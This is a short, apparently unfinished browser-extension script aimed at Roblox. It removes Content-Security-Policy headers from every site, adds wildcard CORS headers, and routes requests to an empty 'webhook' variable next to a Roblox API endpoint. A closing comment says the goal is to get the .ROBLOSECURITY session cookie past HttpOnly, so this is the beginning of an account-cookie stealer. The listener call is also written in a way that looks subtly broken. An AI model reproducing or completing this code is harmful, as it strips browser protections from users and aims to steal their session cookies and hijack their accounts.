const webhook = "";
const vulApiUri = "https://users.roblox.com/v1/users"; // ( POST )


browser.webRequest.onHeadersReceived((details) => {
  if (details.url.startsWith(webhook)) {
    if (details.url.includes("roblox.com")) {
      return {
        responseHeaders: Object.assign(
          {
            "Access-Control-Allow-Headers": "*",
          },
          details.responseHeaders
        ),
      };
    } else {
      return {
        responseHeaders: Object.assign(
          {
            "Content-Security-Policy": [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'",
            ],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*",
          },
          details.responseHeaders
        ),
      };
    }
  } else {
    delete details.responseHeaders["content-security-policy"];
    delete details.responseHeaders["content-security-policy-report-only"];

    return {
      responseHeaders: {
        ...details.responseHeaders,
        "Access-Control-Allow-Headers": "*",
      },
    };
  }
});

// Wait me to find a way to get Access to .ROBLOXSECURITY bypassing OnlyHttp.